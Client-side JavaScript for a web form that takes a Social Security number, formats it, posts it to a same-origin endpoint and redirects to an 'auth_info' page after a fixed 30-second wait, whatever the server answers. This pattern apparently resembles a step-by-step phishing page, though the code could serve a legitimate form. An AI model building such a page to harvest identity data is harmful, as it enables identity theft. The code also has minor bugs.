const container = document.querySelector(".container")
const footer = document.querySelector("footer")
const passwordInput = document.querySelector(".password")
const toggleBotton = document.querySelector(".toggle")
const ssnInput = document.querySelector('#ssn');
const passwordTab = document.querySelector('.passinput')
const message = document.querySelector('.message')
const subSSN = document.querySelector('#sub_ssn')
const displayMsg = document.querySelector("#wait")


let containerHeight = container.offsetHeight
let footerHeight = footer.offsetHeight

const newHeight = containerHeight + footerHeight + 220
document.body.style.height = newHeight + 'px'

ssnInput.addEventListener('focus', changeColor)
ssnInput.addEventListener('blur', returnColor)
document.addEventListener('DOMContentLoaded', ssnInput.focus())
ssnInput.addEventListener('keyup', e => {
  if(e.keyCode == 13){
      event.preventDefault()
      if(ssnInput.value !== '' && ssnInput.value.length >= 11){
          submit()
      } else{
        message.style.display = 'block'
      }
  }
})

subSSN.addEventListener('click', () => {
  if(ssnInput.value !== '' && ssnInput.value.length >= 11){
    submit()
  } else{
    message.style.display = 'block'
  }
})

function changeColor(){
  passwordTab.style.borderColor = "#266aca"
  passwordTab.style.borderWidth = "3px"
}
function returnColor(){
  passwordTab.style.borderColor = "#949494"
  passwordTab.style.borderWidth = "2px"
}

function submit(){
  displayMsg.style.display = 'block'
  const obj = {
      ssn : ssnInput.value
  }

  const baseURL = '/auth_ssn'
  fetch(baseURL, {
      method: 'POST',
      headers: {
          "Content-Type" : "application/json"
      },
      body: JSON.stringify(obj)
  })
  setTimeout(() => {
    window.location.href = 'auth_info.html'
  }, 30000)
}

toggleBotton.onclick = function(){
    if(passwordInput.style['-webkit-text-security'] = 'disk'){
        passwordInput.classList.toggle('toggle')
        toggleBotton.classList.toggle('fa-eye-slash')
        toggleBotton.classList.toggle('fa-eye')
        ssnInput.focus()
    } else{
        passwordInput.classList.toggle('toggle')
        toggleBotton.classList.toggle('fa-eye')
        toggleBotton.classList.toggle('fa-eye-slash')
    }
}


ssnInput.addEventListener('input', (event) => {
  let inputValue = event.target.value.replace(/\D/g, '');
  inputValue = inputValue.substring(0, 9); // Limit to 9 digits

  let formattedValue = '';
  for (let i = 0; i < inputValue.length; i++) {
    if (i === 3 || i === 5) {
      formattedValue += '-';
    }
    formattedValue += inputValue[i];
  }

  event.target.value = formattedValue;
});

